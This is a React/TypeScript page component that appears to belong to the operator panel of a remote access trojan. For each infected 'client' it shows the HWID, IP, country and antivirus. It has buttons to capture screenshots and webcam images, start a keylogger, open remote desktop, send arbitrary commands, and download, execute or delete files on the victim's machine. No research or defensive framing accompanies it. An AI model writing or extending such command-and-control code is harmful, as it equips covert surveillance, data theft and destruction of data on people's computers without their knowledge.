import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { useClientsStore } from '../stores/clientsStore';
import axios from 'axios';
import './ClientDetail.css';

function ClientDetail() {
  const { clientId } = useParams<{ clientId: string }>();
  const navigate = useNavigate();
  const { clients } = useClientsStore();
  const [activeTab, setActiveTab] = useState('info');
  const [command, setCommand] = useState('');
  const [filePath, setFilePath] = useState('C:\\');

  const client = clients.find((c) => c.clientId === clientId);

  if (!client) {
    return (
      <div className="client-not-found">
        <h2>Client not found</h2>
        <button onClick={() => navigate('/clients')} className="back-button">
          Back to Clients
        </button>
      </div>
    );
  }

  const sendCommand = async (cmd: string, params?: Record<string, any>) => {
    try {
      await axios.post(`/api/clients/${clientId}/command`, {
        clientId,
        command: cmd,
        parameters: params,
      });
      alert('Command sent successfully');
    } catch (error) {
      alert('Failed to send command');
      console.error(error);
    }
  };

  const handleCustomCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (command.trim()) {
      await sendCommand(command);
      setCommand('');
    }
  };

  const handleFileManager = async (action: string) => {
    await sendCommand(`filemanager_${action}`, { path: filePath });
  };

  return (
    <div className="client-detail">
      <div className="client-detail-header">
        <button onClick={() => navigate('/clients')} className="back-button">
          ← Back
        </button>
        <h1 className="client-detail-title">
          {client.username}@{client.os}
        </h1>
        <span className={`status-badge ${client.isConnected ? 'online' : 'offline'}`}>
          {client.isConnected ? 'Online' : 'Offline'}
        </span>
      </div>

      <div className="client-tabs">
        <button
          className={`tab ${activeTab === 'info' ? 'active' : ''}`}
          onClick={() => setActiveTab('info')}
        >
          Information
        </button>
        <button
          className={`tab ${activeTab === 'commands' ? 'active' : ''}`}
          onClick={() => setActiveTab('commands')}
        >
          Commands
        </button>
        <button
          className={`tab ${activeTab === 'files' ? 'active' : ''}`}
          onClick={() => setActiveTab('files')}
        >
          File Manager
        </button>
      </div>

      <div className="client-content">
        {activeTab === 'info' && (
          <div className="info-grid">
            <div className="info-card">
              <h3>Client Information</h3>
              <div className="info-row">
                <span className="info-label">Client ID:</span>
                <span className="info-value">{client.clientId}</span>
              </div>
              <div className="info-row">
                <span className="info-label">HWID:</span>
                <span className="info-value">{client.hwid}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Username:</span>
                <span className="info-value">{client.username}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Operating System:</span>
                <span className="info-value">{client.os}</span>
              </div>
              <div className="info-row">
                <span className="info-label">IP Address:</span>
                <span className="info-value">{client.ipAddress}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Country:</span>
                <span className="info-value">{client.country}</span>
              </div>
              <div className="info-row">
                <span className="info-label">Ping:</span>
                <span className="info-value">{client.ping}ms</span>
              </div>
              {client.antiVirus && (
                <div className="info-row">
                  <span className="info-label">Anti-Virus:</span>
                  <span className="info-value">{client.antiVirus}</span>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'commands' && (
          <div className="commands-section">
            <div className="commands-grid">
              <button onClick={() => sendCommand('screenshot')} className="command-btn">
                📸 Screenshot
              </button>
              <button onClick={() => sendCommand('webcam')} className="command-btn">
                📷 Webcam
              </button>
              <button onClick={() => sendCommand('keylogger_start')} className="command-btn">
                ⌨️ Start Keylogger
              </button>
              <button onClick={() => sendCommand('sysinfo')} className="command-btn">
                💻 System Info
              </button>
              <button onClick={() => sendCommand('processlist')} className="command-btn">
                📊 Process List
              </button>
              <button onClick={() => sendCommand('remotedesktop')} className="command-btn">
                🖥️ Remote Desktop
              </button>
            </div>

            <div className="custom-command">
              <h3>Custom Command</h3>
              <form onSubmit={handleCustomCommand}>
                <input
                  type="text"
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  placeholder="Enter command..."
                  className="command-input"
                />
                <button type="submit" className="send-button">
                  Send
                </button>
              </form>
            </div>
          </div>
        )}

        {activeTab === 'files' && (
          <div className="files-section">
            <div className="file-path-bar">
              <input
                type="text"
                value={filePath}
                onChange={(e) => setFilePath(e.target.value)}
                placeholder="Enter path..."
                className="path-input"
              />
              <button onClick={() => handleFileManager('list')} className="path-button">
                List Files
              </button>
            </div>

            <div className="file-actions">
              <button onClick={() => handleFileManager('download')} className="file-action-btn">
                ⬇️ Download
              </button>
              <button onClick={() => handleFileManager('execute')} className="file-action-btn">
                ▶️ Execute
              </button>
              <button onClick={() => handleFileManager('delete')} className="file-action-btn danger">
                🗑️ Delete
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default ClientDetail;
